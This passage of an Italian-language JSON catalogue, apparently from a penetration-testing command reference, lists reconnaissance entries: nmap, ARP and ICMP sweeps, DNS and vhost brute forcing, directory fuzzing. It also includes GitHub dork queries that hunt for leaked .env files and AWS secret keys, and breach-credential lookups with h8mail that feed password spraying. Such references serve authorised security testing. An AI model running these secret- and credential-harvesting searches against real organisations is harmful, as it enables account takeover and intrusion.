        "description": "Salva i risultati in un file JSON navigabile."
      }
    ]
  },
  {
    "id": "github-dorks",
    "name": "GitHub dorking — segreti pubblicati",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Code & Secret Leaks",
    "description": "Cerca sul codice pubblico di GitHub le menzioni del target per trovare segreti pubblicati per errore: file di configurazione, variabili d'ambiente, chiavi. Si usa la ricerca codice di GitHub con query mirate (dork).",
    "note": "# Dork utili\n- `org:<org> filename:.env`\n- `\"<domain>\" password`\n- `org:<org> AWS_SECRET_ACCESS_KEY`\n- `\"<domain>\" filename:config`\n# Prossimo passo\nApri i risultati promettenti e passali a trufflehog o gitleaks per l'estrazione automatica dei segreti.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "github",
      "dork",
      "osint",
      "secrets"
    ],
    "template": "# ricerca codice su GitHub (serve gh autenticato)\ngh search code '<domain> password' --limit 50",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "org",
        "label": "Org GitHub",
        "placeholder": "acme-corp"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "dominio + password",
        "template": "gh search code '<domain> password' --limit 50",
        "description": "Cerca il dominio vicino a parole come password."
      },
      {
        "id": "env",
        "label": "file .env",
        "template": "gh search code 'org:<org> filename:.env'",
        "description": "File di ambiente dell'organizzazione, spesso pieni di segreti."
      },
      {
        "id": "keys",
        "label": "chiavi API",
        "template": "gh search code 'org:<org> AWS_SECRET_ACCESS_KEY'",
        "description": "Cerca pattern di chiavi segrete nei repository dell'organizzazione."
      }
    ]
  },
  {
    "id": "breach-creds",
    "name": "Credenziali da data breach",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Code & Secret Leaks",
    "description": "Cerca credenziali del target trapelate in violazioni di dati pubbliche. Partendo dal dominio o dalle email raccolte, trova password e hash gia esposti, spesso riutilizzabili direttamente sui servizi dell'azienda.",
    "note": "# Fonti\n- h8mail interroga piu fonti di breach a partire da un'email o da un dominio\n- i servizi online dehashed e Have I Been Pwned coprono le violazioni storiche\n# Errori comuni\nLe password trovate sono spesso vecchie: valgono per il riuso (password reuse), non sempre sono ancora attive. Usale solo sui bersagli nel perimetro autorizzato.\n# Prossimo passo\nAlimentano direttamente gli attacchi di accesso: password spray e login sui servizi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "h8mail",
      "breach",
      "osint",
      "credentials",
      "dehashed"
    ],
    "template": "# cerca credenziali trapelate per un dominio\nh8mail -t <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "user",
        "label": "User / email",
        "ctx": "user",
        "placeholder": "jdoe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "dominio",
        "template": "h8mail -t <domain>",
        "description": "Tutte le email del dominio trovate nelle violazioni note."
      },
      {
        "id": "email",
        "label": "email singola",
        "template": "h8mail -t <user>@<domain>",
        "description": "Una email specifica."
      },
      {
        "id": "list",
        "label": "lista email",
        "template": "h8mail -t targets.txt",
        "description": "Un elenco di email raccolte in precedenza."
      }
    ]
  },
  {
    "id": "autorecon",
    "name": "AutoRecon — enum multi-thread",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Orchestratori",
    "description": "Lancia in parallelo una batteria di scansioni ed enumerazioni per servizio, salvando tutto in cartelle ordinate per host e porta. È il modo rapido per partire su uno o più target: mentre si analizzano i primi risultati, in background continua a lavorare. Utile all'inizio, ma non sostituisce l'enumerazione manuale mirata.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "autorecon",
      "recon",
      "enum"
    ],
    "template": "autorecon <ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Singolo host",
        "template": "autorecon <ip>",
        "description": "Enumerazione completa di un host: port scan, poi enum specifica per ogni servizio trovato. I risultati finiscono in `results/<ip>/`."
      },
      {
        "id": "multi",
        "label": "Più host",
        "template": "autorecon -t targets.txt",
        "description": "Enumera in parallelo tutti gli host elencati in `targets.txt`, uno per riga. Comodo su una subnet già ridotta agli host vivi."
      },
      {
        "id": "fast",
        "label": "Solo top ports",
        "template": "autorecon <ip> --port-scans top-100-ports",
        "description": "Versione più rapida che parte dalle prime 100 porte, utile quando il tempo è poco. Poi si può rilanciare con lo scan completo."
      }
    ],
    "note": "# Prossimo passo\nUsalo per avere subito un quadro d'insieme, poi approfondisci a mano i servizi interessanti con i comandi dedicati."
  },
  {
    "id": "nmap-pingsweep",
    "name": "nmap — host discovery subnet",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Trova gli host attivi in una sottorete senza scansionare le porte. Utile dopo essersi spostati in una rete interna, per sapere quali macchine esistono prima di scansionarle.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "nmap",
      "sweep",
      "discovery"
    ],
    "template": "sudo nmap -sn <subnet> -oA nmap/ping_sweep",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Ping sweep",
        "template": "sudo nmap -sn <subnet> -oA nmap/ping_sweep",
        "description": "Probe di default (`-sn`): ARP in LAN, altrimenti ICMP echo più TCP ACK 80 e ICMP timestamp. Gli host vivi finiscono in `live_hosts.txt`."
      },
      {
        "id": "arp",
        "label": "ARP (LAN)",
        "template": "sudo nmap -sn -PR <subnet> -oA nmap/ping_sweep",
        "description": "Solo ARP (`-PR`): il metodo più affidabile sulla stessa L2, non filtrabile da un firewall di livello 3. Vale solo in rete interna."
      },
      {
        "id": "icmp",
        "label": "ICMP echo",
        "template": "sudo nmap -sn -PE <subnet> -oA nmap/ping_sweep",
        "description": "Solo ICMP echo (`-PE`), il classico ping. Rapido su reti esterne che lasciano passare l'ICMP."
      },
      {
        "id": "icmp-alt",
        "label": "ICMP timestamp/netmask",
        "template": "sudo nmap -sn -PP -PM <subnet> -oA nmap/ping_sweep",
        "description": "ICMP timestamp (`-PP`) e netmask (`-PM`): fallback quando l'echo request è bloccato ma altri tipi di ICMP passano."
      },
      {
        "id": "tcp-syn",
        "label": "TCP SYN ping",
        "template": "sudo nmap -sn -PS21,22,25,80,443,3389 <subnet> -oA nmap/ping_sweep",
        "description": "SYN ping (`-PS`) su porte comuni: scopre host via TCP quando l'ICMP è filtrato. Un SYN/ACK o un RST = host vivo."
      },
      {
        "id": "tcp-ack",
        "label": "TCP ACK ping",
        "template": "sudo nmap -sn -PA80,443 <subnet> -oA nmap/ping_sweep",
        "description": "ACK ping (`-PA`): attraversa i firewall stateless. Va combinato con il SYN ping per coprire più casi."
      },
      {
        "id": "udp",
        "label": "UDP ping",
        "template": "sudo nmap -sn -PU53,161,137 <subnet> -oA nmap/ping_sweep",
        "description": "UDP ping (`-PU`) su DNS/SNMP/NetBIOS: utile quando sia TCP che ICMP sono bloccati ma qualche servizio UDP risponde."
      }
    ],
    "refs": [
      {
        "label": "Nmap host discovery",
        "url": "https://nmap.org/book/man-host-discovery.html"
      }
    ],
    "note": "# Errori comuni\nSe sembrano tutti spenti, è il firewall che blocca i pacchetti di prova standard: cambia tipo di sonda, con ARP in rete locale oppure con prove TCP e UDP quando l'ICMP è filtrato."
  },
  {
    "id": "arp-scan",
    "name": "arp-scan — host discovery L2",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Scoperta degli host a livello di rete locale tramite ARP: invia una richiesta per ogni indirizzo della sottorete. È il metodo più affidabile in rete interna, perché l'ARP non può essere filtrato da un firewall e risponde anche chi ignora ping e connessioni TCP.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "arp"
    ],
    "tags": [
      "arp-scan",
      "arp",
      "discovery",
      "lan"
    ],
    "template": "sudo arp-scan -I <iface> --localnet",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "eth0"
      }
    ],
    "refs": [
      {
        "label": "arp-scan — Kali Tools",
        "url": "https://www.kali.org/tools/arp-scan/"
      }
    ],
    "note": "# Errori comuni\nFunziona solo sulla stessa rete fisica, non attraverso i router. Richiede i privilegi di root."
  },
  {
    "id": "netdiscover",
    "name": "netdiscover — ARP discovery",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Scoperta di host tramite ARP in rete interna. La modalita passiva, che ascolta il traffico senza inviare nulla, è utile per restare silenziosi dopo essersi spostati in una nuova rete.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "arp"
    ],
    "tags": [
      "netdiscover",
      "arp",
      "discovery",
      "passive"
    ],
    "template": "sudo netdiscover -i <iface> -r <subnet>",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "eth0"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "active",
        "label": "Attivo",
        "template": "sudo netdiscover -i <iface> -r <subnet>",
        "description": "Invia richieste ARP a tutta la subnet: veloce e completo."
      },
      {
        "id": "passive",
        "label": "Passivo",
        "template": "sudo netdiscover -i <iface> -p",
        "description": "Solo ascolto (`-p`): non invia pacchetti, mappa gli host dal traffico ARP che vede. Silenzioso ma lento."
      }
    ],
    "refs": [
      {
        "label": "netdiscover — Kali Tools",
        "url": "https://www.kali.org/tools/netdiscover/"
      }
    ],
    "note": "# Opzioni\n- `-r` modalita attiva: invia richieste ARP a tutta la sottorete\n- `-p` modalita passiva: ascolta il traffico senza inviare nulla\n# Errori comuni\nSolo stessa rete locale, richiede i privilegi di root."
  },
  {
    "id": "fping-sweep",
    "name": "fping — fast ICMP sweep",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Ping sweep veloce via ICMP: invia i pacchetti a tutta la sottorete in parallelo, molto più rapido di un ciclo di ping. Utile anche in rete esterna, dove l'ICMP di solito passa.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "fping",
      "icmp",
      "sweep",
      "discovery"
    ],
    "template": "fping -a -g <subnet> 2>/dev/null | tee live_hosts.txt",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "refs": [
      {
        "label": "fping — homepage",
        "url": "https://fping.org/"
      }
    ],
    "note": "# Opzioni\n- `-a` stampa solo gli host attivi\n- `-g` genera il range di indirizzi dalla sottorete\n# Prossimo passo\nL'elenco degli host vivi viene salvato in `live_hosts.txt` e usato come input per le scansioni."
  },
  {
    "id": "rtt-check",
    "name": "RTT check — Prima di scansionare",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Misura la latenza verso il target, cioe quanto tempo impiega un pacchetto ad andare e tornare. Il valore decide quanto si può spingere nmap senza perdere porte: più la rete è lenta o instabile, più conviene rallentare e aumentare i tentativi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "ping",
      "hping3",
      "rtt",
      "latency"
    ],
    "template": "ping -c 5 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ping",
        "template": "ping -c 5 <ip>",
        "description": "ICMP echo: leggi `rtt min/avg/max` nell’ultima riga."
      },
      {
        "id": "hping80",
        "label": "hping3:80",
        "template": "sudo hping3 -S -p 80 -c 5 <ip>",
        "description": "SYN sulla 80 quando l’ICMP è filtrato: l’RTT si ricava dai pacchetti di risposta."
      },
      {
        "id": "hping443",
        "label": "hping3:443",
        "template": "sudo hping3 -S -p 443 -c 5 <ip>",
        "description": "Fallback sulla 443 se la 80 non risponde."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting Network",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html"
      }
    ],
    "note": "# Output atteso\nIn base alla latenza misurata, regola la velocità di nmap:\n- sotto 30 ms: `--min-rate 5000 --max-retries 2`\n- tra 30 e 100 ms (tipica VPN): `--min-rate 3000 --max-retries 3`\n- oltre 100 ms o instabile: `--min-rate 1000 --max-retries 5`\n# Errori comuni\nSe il ping ICMP è bloccato, usa hping3 con un pacchetto TCP e ricava la latenza dalla risposta."
  },
  {
    "id": "nmap-quick",
    "name": "nmap — quick scan",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Scansione delle prime 1000 porte TCP più comuni. È il primo controllo da lanciare: restituisce subito i servizi principali in ascolto, mentre in parallelo si avvia la scansione completa di tutte le porte.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "scan"
    ],
    "template": "sudo nmap -sC -sV -O --open -oA nmap/quick <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Rapido",
        "template": "sudo nmap -sC -sV -O --open -oA nmap/quick <ip>",
        "description": "Top 1000 + `-sC -sV -O`. Copre i servizi più comuni in pochi secondi."
      },
      {
        "id": "pn",
        "label": "-Pn (no ping)",
        "template": "sudo nmap -sC -sV -O -Pn --open -oA nmap/quick <ip>",
        "description": "Salta l'host discovery. Serve quando l'host blocca l'ICMP e nmap lo segna come “down”."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ],
    "note": "# Opzioni\n- `-sC` esegue gli script di default di nmap\n- `-sV` rileva il servizio e la sua versione\n- `-O` prova a identificare il sistema operativo\n- `--open` mostra solo le porte aperte\n- `-oA` salva l'output nei tre formati\n# Prossimo passo\nApprofondisci le porte trovate con la scansione mirata, che lancia script e rilevamento versione solo su quelle porte."
  },
  {
    "id": "nmap-full",
    "name": "nmap — full TCP",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Scansione di tutte le 65535 porte TCP. È un passaggio obbligatorio, perché i servizi più interessanti stanno spesso su porte alte che la scansione veloce non copre. Si lancia in parallelo a quella veloce e si lascia girare in background.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "scan",
      "full-tcp"
    ],
    "template": "sudo nmap -p- -sS -T4 --min-rate 3000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tuned (VPN)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 3000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
        "description": "Bilanciato per VPN (RTT ~50ms). Buon default."
      },
      {
        "id": "fast",
        "label": "Veloce (RTT<30)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 5000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
        "description": "Solo su reti veloci e stabili; su VPN droppa porte."
      },
      {
        "id": "safe",
        "label": "Sicuro (instabile)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 1000 --max-retries 5 --open -oA nmap/full_tcp_safe <ip>",
        "description": "Rete lenta o porte sospette mancanti: più lento ma affidabile."
      },
      {
        "id": "proxychains",
        "label": "proxychains",
        "template": "proxychains -q nmap -sT -Pn -T4 -p- --max-retries 2 <ip>",
        "description": "Via pivot/tunnel: obbligatori `-sT` (no raw socket) e `-Pn`."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ],
    "note": "# Opzioni\n- `-p-` controlla tutte le porte\n- `-sS` invia solo il primo pacchetto della connessione, più rapido (richiede i privilegi di root)\n- `--min-rate 3000` fissa la velocità minima di invio dei pacchetti\n- `--max-retries 2` riduce le ritrasmissioni per andare più veloce\n# Errori comuni\nSu una macchina virtuale dietro VPN non superare `--min-rate 5000`, altrimenti alcune porte vengono perse. Se mancano dei risultati, abbassa la velocità e aumenta i tentativi."
  },
  {
    "id": "nmap-targeted",
    "name": "nmap — service scan",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Scansione approfondita solo sulle porte già trovate dalla scansione completa. È qui che si raccolgono le versioni dei servizi e i banner, da incrociare poi con le vulnerabilità note.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "targeted"
    ],
    "template": "sudo nmap -p<ports> -sC -sV -O -oA nmap/targeted <ip>",
    "params": [
      {
        "key": "ports",
        "label": "Porte",
        "placeholder": "22,80,445"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ],
    "note": "# Opzioni\n- `-sV` rileva servizio e versione\n- `-sC` esegue gli script di default\n- `-O` identifica il sistema operativo\n# Prossimo passo\nPorta le versioni raccolte nella fase di analisi delle vulnerabilità per cercare exploit noti."
  },
  {
    "id": "nmap-vuln",
    "name": "nmap — vuln NSE",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Lancia gli script di nmap della categoria vulnerabilità sulle porte già note, per un controllo rapido di falle conosciute.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "vuln",
      "nse"
    ],
    "template": "sudo nmap -p<ports> --script vuln -oA nmap/vuln <ip>",
    "params": [
      {
        "key": "ports",
        "label": "Porte",
        "placeholder": "80,443"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "NSE — categoria vuln",
        "url": "https://nmap.org/nsedoc/categories/vuln.html"
      }
    ],
    "note": "# Errori comuni\nQuesti script generano molto traffico e tentano exploit noti: usarli solo in laboratorio o con autorizzazione esplicita, mai dove conta restare silenziosi."
  },
  {
    "id": "nmap-udp",
    "name": "nmap — UDP top ports",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "UDP Scans",
    "description": "Scansione delle porte UDP, da non dimenticare: diversi servizi importanti rispondono solo su UDP e una scansione TCP non li vedrebbe mai.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "udp"
    ],
    "tags": [
      "nmap",
      "udp"
    ],
    "template": "sudo nmap -sU --top-ports 100 --open -oA nmap/udp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Top 100",
        "template": "sudo nmap -sU --top-ports 100 --open -oA nmap/udp <ip>",
        "description": "Compromesso tra copertura e tempo."
      },
      {
        "id": "key",
        "label": "Porte chiave",
        "template": "sudo nmap -sU -p 53,69,123,161,500,623 --open -oA nmap/udp <ip>",
        "description": "Solo i servizi UDP che contano: velocissimo."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ],
    "note": "# Opzioni\n- `-sU` scansiona le porte UDP\n- `--top-ports 100` si limita alle cento più comuni, perché UDP è molto lento\n# Output atteso\nServizi come DNS (53), SNMP (161), IPMI (623), TFTP (69) e NTP (123), spesso vettori d'attacco."
  },
  {
    "id": "unicornscan-udp",
    "name": "unicornscan — fast UDP",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "UDP Scans",
    "description": "Scanner UDP asincrono: invia i pacchetti e riceve le risposte in parallelo, quindi copre tutte le porte molto più in fretta della scansione UDP di nmap. Adatto a un primo passaggio completo su UDP.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "udp"
    ],
    "tags": [
      "unicornscan",
      "udp",
      "scan"
    ],
    "template": "sudo unicornscan -m U -Iv <ip>:1-65535 -r 5000",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "unicornscan — Kali Tools",
        "url": "https://www.kali.org/tools/unicornscan/"
      }
    ],
    "note": "# Opzioni\n- `-m U` imposta la modalita UDP\n- `-Iv` mostra l'output subito e in modo dettagliato\n- `-r 5000` invia 5000 pacchetti al secondo\n# Prossimo passo\nLe porte trovate vanno confermate con `nmap -sU -sV`, più lento ma preciso. Richiede i privilegi di root."
  },
  {
    "id": "whatweb",
    "name": "whatweb — fingerprint",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Fingerprinting",
    "description": "Identifica le tecnologie di un sito web: server, sistema di gestione dei contenuti, framework e relative versioni. Va lanciato su ogni sito trovato prima del fuzzing.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "whatweb",
      "fingerprint"
    ],
    "template": "whatweb http://<ip> -a 3",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "WhatWeb — GitHub",
        "url": "https://github.com/urbanadventurer/WhatWeb"
      }
    ],
    "note": "# Opzioni\n`-a 3` è il livello di aggressivita massimo: invia più richieste e restituisce più dettagli, al costo di essere più evidente."
  },
  {
    "id": "eyewitness",
    "name": "eyewitness — screenshot di massa",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Fingerprinting",
    "description": "Fa uno screenshot di tutti gli indirizzi di una lista, per esaminare in fretta una superficie web ampia: con un colpo d'occhio si capisce quali applicazioni meritano attenzione. Genera un report navigabile.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "eyewitness",
      "screenshot"
    ],
    "template": "eyewitness --web -f urls.txt -d eyewitness_output",
    "params": [],
    "refs": [
      {
        "label": "EyeWitness — GitHub",
        "url": "https://github.com/RedSiege/EyeWitness"
      }
    ]
  },
  {
    "id": "dig-reverse",
    "name": "dig — reverse PTR",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Reverse Lookup",
    "description": "Interroga il record PTR di un indirizzo IP, cioe la risoluzione inversa da indirizzo a nome. Se la porta DNS è aperta, spesso rivela subito il dominio senza doverlo indovinare.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "reverse",
      "ptr"
    ],
    "template": "dig -x <ip> @<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "DNS autoritativo",
        "template": "dig -x <ip> @<ip>",
        "description": "Chiede al DNS del target stesso: funziona se gestisce la propria zona reverse (tipico CTF/lab e DNS interni)."
      },
      {
        "id": "resolver",
        "label": "Resolver di default",
        "template": "dig -x <ip>",
        "description": "Interroga il resolver locale della macchina e trova il PTR registrato sul DNS pubblico del provider."
      },
      {
        "id": "nslookup",
        "label": "nslookup",
        "template": "nslookup <ip> <ip>",
        "description": "Equivalente con nslookup, forzando la query verso il target."
      }
    ],
    "note": "# Output atteso\nI record PTR vivono nella zona `in-addr.arpa`, con l'indirizzo scritto al contrario. Un nome restituito può svelare l'hostname interno o il dominio del target.",
    "refs": [
      {
        "label": "HackTricks — Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ]
  },
  {
    "id": "dns-brute",
    "name": "DNS subdomain brute",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Subdomain Brute",
    "description": "Scopre sottodomini provando a tentativi i nomi di una lista contro il DNS, quando le fonti passive non bastano. Serve ad arrivare ai sottodomini non pubblicati da nessuna parte.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dns",
      "subdomains",
      "bruteforce"
    ],
    "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "ip",
        "label": "Nameserver",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "dnsenum",
        "template": "dnsenum --enum --dnsserver <ip> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>",
        "description": "Bruteforce + AXFR + whois in un tool solo. È `-f` ad attivare il bruteforce: senza wordlist dnsenum si limita a enumerare i record. `--dnsserver` manda le query al DNS indicato, obbligatorio sui domini interni che il resolver locale non risolve."
      },
      {
        "id": "puredns",
        "label": "puredns",
        "template": "puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain> --resolvers resolvers.txt",
        "description": "Bruteforce ad alta velocità con resolver multipli: gestisce wordlist enormi."
      },
      {
        "id": "permut",
        "label": "Permutazioni",
        "template": "dnsgen all_subs.txt | puredns resolve --resolvers resolvers.txt",
        "description": "Genera varianti dai sub noti (dev1, dev2, api-staging…) e le risolve."
      },
      {
        "id": "dnsrecon",
        "label": "Reverse range",
        "template": "dnsrecon -r <subnet> -n <ip>",
        "description": "PTR su un intero range: scopre host dal reverse DNS."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting DNS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
      }
    ],
    "note": "# Prossimo passo\nPer trovarne altri, genera varianti dai sottodomini già noti e risolvile in massa."
  },
  {
    "id": "ffuf-vhost",
    "name": "ffuf — vhost (Host header)",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Virtual Hosts",
    "description": "Scopre i virtual host provando a tentativi l'intestazione Host delle richieste, senza modificare il file hosts locale. I virtual host nascondono spesso applicazioni interne non raggiungibili altrimenti.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ffuf",
      "vhost",
      "web"
    ],
    "template": "ffuf -u http://<ip> -H \"Host: FUZZ.<domain>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <fsize>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "inlanefreight.local"
      },
      {
        "key": "fsize",
        "label": "Filter size",
        "placeholder": "4242"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Web pentesting",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      }
    ],
    "note": "# Opzioni\n- `-fs` filtra per dimensione della risposta, per togliere la risposta di default del server\n- `-fc` filtra per codice di risposta"
  },
  {
    "id": "gobuster-vhost",
    "name": "gobuster — vhost",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Virtual Hosts",
    "description": "Ricerca di virtual host con gobuster. Richiede che il dominio sia già risolvibile; altrimenti conviene usare ffuf con l'intestazione Host.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gobuster",
      "vhost"
    ],
    "template": "gobuster vhost -u http://<domain> -w <wordlist> --append-domain --exclude-length <len>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "inlanefreight.local"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
      },
      {
        "key": "len",
        "label": "Exclude length",
        "placeholder": "436"
      }
    ],
    "refs": [
      {
        "label": "gobuster — GitHub",
        "url": "https://github.com/OJ/gobuster"
      }
    ],
    "note": "# Opzioni\n- `--append-domain` accoda il dominio alle parole della lista\n- `--exclude-length` filtra la risposta di default in base alla lunghezza"
  },
  {
    "id": "ffuf-dir",
    "name": "ffuf — directory fuzz",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Directory Fuzzing",
    "description": "Cerca file e directory nascoste di un sito web provando a tentativi i nomi presi da una lista. È il modo principale per scoprire pagine e risorse non raggiungibili dai link.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ffuf",
      "fuzzing",
      "web"
    ],
    "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "path",
        "label": "Path base",
        "placeholder": "/"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Media",
        "template": "ffuf -u http://<ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json -of json",
        "description": "Wordlist media: buon equilibrio copertura/tempo."
      },
      {
        "id": "ext",
        "label": "Con estensioni",
